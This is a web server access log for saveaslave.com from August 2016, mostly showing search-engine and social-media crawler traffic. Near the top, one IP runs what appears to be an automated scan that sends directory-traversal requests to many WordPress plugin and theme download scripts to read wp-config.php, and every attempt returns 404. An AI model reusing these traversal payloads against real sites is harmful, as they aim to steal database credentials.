50.18.94.121 - - [07/Aug/2016:16:13:47 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" "saveaslave.com"
50.18.94.121 - - [07/Aug/2016:16:13:47 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" "saveaslave.com"
208.115.113.86 - - [07/Aug/2016:16:23:09 -0700] "GET /stvincent HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
159.203.61.153 - - [07/Aug/2016:16:28:30 -0700] "HEAD / HTTP/1.1" 200 0 "-" "curl/7.38.0" "saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:53:52 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[1]
46.161.9.35 - - [07/Aug/2016:16:54:05 -0700] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:54:32 -0700] "GET /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:56:00 -0700] "GET /wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:56:10 -0700] "GET /wp-content/plugins/db-backup/download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:56:17 -0700] "GET /wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:56:22 -0700] "GET /wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:56:27 -0700] "GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:56:31 -0700] "GET /wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:56:36 -0700] "GET /wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:56:40 -0700] "GET /wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:56:44 -0700] "GET /wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:56:58 -0700] "GET /wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:57:03 -0700] "GET /wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:57:07 -0700] "GET /wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:57:12 -0700] "GET /wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:57:17 -0700] "GET /wp-content/themes/TheLoft/download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:57:30 -0700] "GET /wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:57:35 -0700] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:57:39 -0700] "GET /wp-content/themes/corporate_works/downloader.php?file_download=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:57:44 -0700] "GET /wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:57:47 -0700] "GET /wp-content/themes/felis/download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:58:01 -0700] "GET /wp-content/themes/lote27/download.php?download=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:09 -0700] "GET /wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:12 -0700] "GET /wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:17 -0700] "GET /wp-content/themes/tess/download.php?file=../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:20 -0700] "GET /wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:24 -0700] "GET /wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:43 -0700] "POST /wp-content/themes/persuasion/lib/scripts/dl-skin.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:55 -0700] "POST /wp-content/themes/elegance/lib/scripts/dl-skin.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:58:58 -0700] "POST /wp-content/themes/method/lib/scripts/dl-skin.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"[0]
46.161.9.35 - - [07/Aug/2016:16:59:00 -0700] "POST /wp-content/themes/myriad/lib/scripts/dl-skin.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
46.161.9.35 - - [07/Aug/2016:16:59:05 -0700] "POST /wp-content/themes/construct/lib/scripts/dl-skin.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "www.saveaslave.com"
50.87.144.76 - - [07/Aug/2016:17:10:03 -0700] "POST /wp-checking.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"
50.87.144.76 - - [07/Aug/2016:17:10:06 -0700] "POST / HTTP/1.1" 200 76329 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[1]
50.87.144.76 - - [07/Aug/2016:17:10:07 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Firefox/13.0" "saveaslave.com"
50.87.144.76 - - [07/Aug/2016:17:10:08 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Firefox/13.0" "saveaslave.com"
65.36.241.48 - - [07/Aug/2016:17:13:58 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
173.252.90.242 - - [07/Aug/2016:17:32:26 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"
106.120.173.111 - - [07/Aug/2016:17:56:58 -0700] "GET /site/?feed=rss2 HTTP/1.1" 404 89 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "saveaslave.com"[0]
65.36.241.48 - - [07/Aug/2016:18:28:07 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
157.55.39.117 - - [07/Aug/2016:18:34:57 -0700] "GET /solomon-islands.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"[0]
157.55.39.117 - - [07/Aug/2016:18:34:57 -0700] "GET /articles.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
157.55.39.117 - - [07/Aug/2016:18:34:57 -0700] "GET /Flight_Information.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
159.203.61.153 - - [07/Aug/2016:18:46:46 -0700] "HEAD / HTTP/1.1" 200 0 "-" "curl/7.38.0" "saveaslave.com"[0]
159.203.61.153 - - [07/Aug/2016:18:51:04 -0700] "HEAD / HTTP/1.1" 200 0 "-" "curl/7.38.0" "saveaslave.com"[0]
62.212.73.211 - - [07/Aug/2016:19:15:27 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "saveaslave.com"[1]
208.115.113.86 - - [07/Aug/2016:19:17:26 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
178.137.86.253 - - [07/Aug/2016:19:42:25 -0700] "GET / HTTP/1.1" 200 89941 "http://flight-tickets.info/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" "saveaslave.com"[1]
178.137.86.253 - - [07/Aug/2016:19:42:25 -0700] "GET / HTTP/1.1" 200 89941 "http://carsplate.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" "saveaslave.com"[1]
65.36.241.48 - - [07/Aug/2016:19:44:12 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
204.236.235.245 - - [07/Aug/2016:19:48:06 -0700] "GET /our-supporters.php HTTP/1.1" 200 55443 "-" "ia_archiver" "www.saveaslave.com"[1]
157.55.39.117 - - [07/Aug/2016:20:15:22 -0700] "GET /malawi.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"
157.55.39.117 - - [07/Aug/2016:20:46:17 -0700] "GET /singapore.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "saveaslave.com"
51.255.65.24 - - [07/Aug/2016:21:00:01 -0700] "GET /www.legalmomentum.org HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "www.saveaslave.com"
69.171.228.118 - - [07/Aug/2016:21:02:10 -0700] "GET / HTTP/1.1" 200 89977 "-" "facebookexternalhit/1.1" "saveaslave.com"
69.171.228.116 - - [07/Aug/2016:21:02:10 -0700] "GET /assets/js/ie-emulation-modes-warning.js HTTP/1.1" 206 2130 "-" "facebookexternalhit/1.1" "saveaslave.com"
173.252.90.102 - - [07/Aug/2016:21:31:53 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"
180.76.15.149 - - [07/Aug/2016:21:34:46 -0700] "GET /country.php?name=Guyana&lang=en HTTP/1.1" 200 52502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"[1]
65.36.241.48 - - [07/Aug/2016:21:38:25 -0700] "HEAD /?tpl=references&Itemid=3 HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"[1]
208.115.113.86 - - [07/Aug/2016:21:47:03 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
208.115.113.86 - - [07/Aug/2016:21:47:03 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
65.36.241.48 - - [07/Aug/2016:22:14:09 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
31.13.102.124 - - [07/Aug/2016:22:32:59 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"
151.80.31.101 - - [07/Aug/2016:22:39:46 -0700] "GET /gambia.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
164.132.161.61 - - [07/Aug/2016:22:40:33 -0700] "GET /algeria.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "www.saveaslave.com"
157.55.39.97 - - [07/Aug/2016:22:42:37 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"
66.220.158.120 - - [07/Aug/2016:22:44:35 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"
65.36.241.48 - - [07/Aug/2016:23:28:22 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
208.115.113.86 - - [07/Aug/2016:23:54:00 -0700] "GET /article.php?id=99 HTTP/1.1" 200 776 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:00:00:09 -0700] "GET /article.php?id=6 HTTP/1.1" 200 47545 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"[2]
199.16.156.126 - - [08/Aug/2016:00:00:52 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Twitterbot/1.0" "saveaslave.com"
199.59.148.209 - - [08/Aug/2016:00:00:52 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Twitterbot/1.0" "saveaslave.com"
199.59.148.209 - - [08/Aug/2016:00:00:54 -0700] "GET / HTTP/1.1" 200 89977 "-" "Twitterbot/1.0" "saveaslave.com"
199.16.156.126 - - [08/Aug/2016:00:00:54 -0700] "GET / HTTP/1.1" 200 89977 "-" "Twitterbot/1.0" "saveaslave.com"
17.142.159.177 - - [08/Aug/2016:00:00:54 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"
50.18.94.121 - - [08/Aug/2016:00:00:54 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" "saveaslave.com"[1]
50.18.94.121 - - [08/Aug/2016:00:00:54 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" "saveaslave.com"
144.76.22.172 - - [08/Aug/2016:00:00:55 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060613 Firefox/1.5.0.4" "saveaslave.com"
144.76.22.172 - - [08/Aug/2016:00:00:56 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060613 Firefox/1.5.0.4" "saveaslave.com"
54.89.163.35 - - [08/Aug/2016:00:01:18 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)" "saveaslave.com"[0]
54.89.163.35 - - [08/Aug/2016:00:01:19 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)" "saveaslave.com"[1]
17.142.159.177 - - [08/Aug/2016:00:08:58 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"[0]
208.115.113.86 - - [08/Aug/2016:00:38:42 -0700] "GET /classifieds/index.php?view=ads&catid=1008&subcatid=&cityid=0 HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:00:38:43 -0700] "GET /netherlands HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:00:38:43 -0700] "GET /burundi HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
46.118.158.81 - - [08/Aug/2016:00:41:37 -0700] "GET / HTTP/1.1" 200 89941 "http://www.symbol-s.ru/" "Mozilla/4.7 (compatible; OffByOne; Windows 2000) Webster Pro V3.4" "saveaslave.com"[1]
46.118.158.81 - - [08/Aug/2016:00:41:37 -0700] "GET / HTTP/1.1" 200 89941 "http://www.symbol-s.ru/" "Mozilla/4.7 (compatible; OffByOne; Windows 2000) Webster Pro V3.4" "saveaslave.com"
65.36.241.48 - - [08/Aug/2016:00:47:05 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
31.13.98.113 - - [08/Aug/2016:00:57:36 -0700] "GET / HTTP/1.1" 200 89977 "-" "facebookexternalhit/1.1" "saveaslave.com"[1]
31.13.98.113 - - [08/Aug/2016:00:57:37 -0700] "GET /js/bootstrap.min.js HTTP/1.1" 206 37055 "-" "facebookexternalhit/1.1" "saveaslave.com"
31.13.98.119 - - [08/Aug/2016:00:57:37 -0700] "GET /assets/js/ie-emulation-modes-warning.js HTTP/1.1" 206 2130 "-" "facebookexternalhit/1.1" "saveaslave.com"
31.13.98.115 - - [08/Aug/2016:00:57:37 -0700] "GET /gfeedfetcher.js HTTP/1.1" 206 9018 "-" "facebookexternalhit/1.1" "saveaslave.com"
31.13.98.119 - - [08/Aug/2016:00:57:37 -0700] "GET /gajaxscroller.js HTTP/1.1" 206 9774 "-" "facebookexternalhit/1.1" "saveaslave.com"
31.13.98.118 - - [08/Aug/2016:00:57:37 -0700] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 206 641 "-" "facebookexternalhit/1.1" "saveaslave.com"
180.76.15.12 - - [08/Aug/2016:01:13:04 -0700] "GET /article.php?id=46 HTTP/1.1" 200 49280 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
45.32.131.61 - - [08/Aug/2016:01:17:13 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" "saveaslave.com"
157.55.39.117 - - [08/Aug/2016:01:24:50 -0700] "GET /ethiopia HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"[0]
66.220.152.34 - - [08/Aug/2016:01:25:17 -0700] "GET / HTTP/1.1" 200 89977 "-" "facebookexternalhit/1.1" "saveaslave.com"
208.115.113.86 - - [08/Aug/2016:01:50:34 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:01:50:34 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
89.145.95.43 - - [08/Aug/2016:02:06:31 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)" "www.saveaslave.com"
164.132.161.10 - - [08/Aug/2016:02:13:08 -0700] "GET /thailand.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
180.76.15.19 - - [08/Aug/2016:02:41:33 -0700] "GET /country.php?name=Kuwait&lang=en HTTP/1.1" 200 52768 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
62.25.109.207 - - [08/Aug/2016:02:51:29 -0700] "GET /images/top.jpg HTTP/1.1" 200 50519 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" "www.saveaslave.com"
151.80.31.104 - - [08/Aug/2016:02:54:26 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
151.80.31.103 - - [08/Aug/2016:02:54:27 -0700] "GET /montenegro.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
173.252.90.247 - - [08/Aug/2016:03:04:26 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"[0]
105.112.39.78 - - [08/Aug/2016:03:34:49 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "Mozilla/5.0" "saveaslave.com"
105.112.39.78 - - [08/Aug/2016:03:34:49 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "Mozilla/5.0" "saveaslave.com"
54.234.94.216 - - [08/Aug/2016:03:38:57 -0700] "GET / HTTP/1.1" 200 89977 "-" "roboto" "saveaslave.com"
54.234.94.216 - - [08/Aug/2016:03:38:58 -0700] "GET /css/style-pages.css HTTP/1.1" 200 9894 "-" "roboto" "saveaslave.com"
208.115.113.86 - - [08/Aug/2016:03:42:41 -0700] "GET /czech-republic.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:03:42:42 -0700] "GET /australia.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:03:45:37 -0700] "GET /article.php?id=2 HTTP/1.1" 200 48363 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"[1]
66.249.69.188 - - [08/Aug/2016:03:52:25 -0700] "GET /apple-app-site-association HTTP/1.1" 403 255 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "saveaslave.com"[0]
65.36.241.48 - - [08/Aug/2016:03:53:00 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
180.76.15.141 - - [08/Aug/2016:04:07:27 -0700] "GET /country.php?name=Cyprus&lang=en HTTP/1.1" 200 52665 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
31.13.112.117 - - [08/Aug/2016:04:15:18 -0700] "GET / HTTP/1.1" 200 89977 "-" "facebookexternalhit/1.1" "saveaslave.com"
208.115.113.86 - - [08/Aug/2016:04:28:03 -0700] "GET /sudan HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
51.255.65.79 - - [08/Aug/2016:04:30:37 -0700] "GET /article.php?id=4 HTTP/1.1" 200 50849 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"[1]
151.80.31.176 - - [08/Aug/2016:04:37:41 -0700] "GET /bahrain.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
50.18.94.121 - - [08/Aug/2016:05:22:37 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" "saveaslave.com"
17.142.159.177 - - [08/Aug/2016:05:22:37 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"[0]
54.209.222.245 - - [08/Aug/2016:05:22:50 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)" "saveaslave.com"
